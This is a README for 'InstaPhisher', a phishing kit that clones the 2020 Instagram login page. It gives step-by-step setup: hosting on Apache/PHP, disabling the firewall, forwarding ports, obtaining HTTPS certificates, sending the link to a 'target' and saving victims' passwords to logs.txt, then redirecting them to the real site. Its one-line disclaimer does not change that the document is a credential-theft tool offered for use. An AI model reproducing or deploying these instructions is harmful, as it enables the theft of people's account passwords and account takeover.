# InstaPhisher - 2020

![Alt text](screenshot/terminal.png?raw=true "Screenshot")

__author__ Exilas <br/>
__version__ 2.3

# Disclamer

I am in no way responsible for illegal uses.


# Information

This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi) and php (https://www.php.net/downloads).

Then, move all InstaPhisher files to the apache folder ("/var/www/html" for linux). Make sure to disable your firewall and redirect the port 80 (UDP/TCP) on your router to your machine. If you use Linux, you must grant read and write permissions to the files logs.txt and serverMsg.txt when it will be created. After, use python in a terminal and start the file InstaPhisher.py. Send your DNS url to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.

![Alt text](screenshot/logs.png?raw=true "Screenshot")

You can modify the redirect link in the login.php file. Enter url in header() function, after 'Location: ' at line 38. The default redirection is https://www.instagram.com.

Exemple:
-   header("Location: https://www.instagram.com");
-   header("Location: <redirection_url>");

You can also obtain SSL certificates with Let's Encrypt to benefit from an https connection. In this case you will have to redirect ports 80 and 443 (UDP/TCP) of your router to your machine.

The InstaPhisher file is only used to notify you when a new password is captured. It is therefore not necessary to open it.


# Installation

## Linux

```
git clone https://github.com/ExilasP/InstaPhisher.git
cd InstaPhisher
cp * -r '/var/www/html'
cd /var/www/html
touch logs.txt && touch serverMsg.txt
sudo chmod 777 logs.txt && chmod 777 serverMsg.txt
service apache2 start
python InstaPhisher.py
```

# Notice

## Requirements

-   Python : https://www.python.org/downloads/
-   Apache : https://httpd.apache.org/download.cgi
-   Php    : https://www.php.net/downloads
-   DNS    : https://www.freenom.com/

## Usage

### Linux:

```
service apache2 start   #"service apache2 stop" for stop 
python InstaPhisher.py  #Not required but recommended
```

### Windows:

With admin cmd
```
cd C:\Apache24\bin
httpd.exe -k start          #"httpd.exe -k stop" for stop
C:\Apache24\htdocs\InstaPhisher.py
```

# Screenshot

![Alt text](screenshot/instaPhisher.png?raw=true "Screenshot")
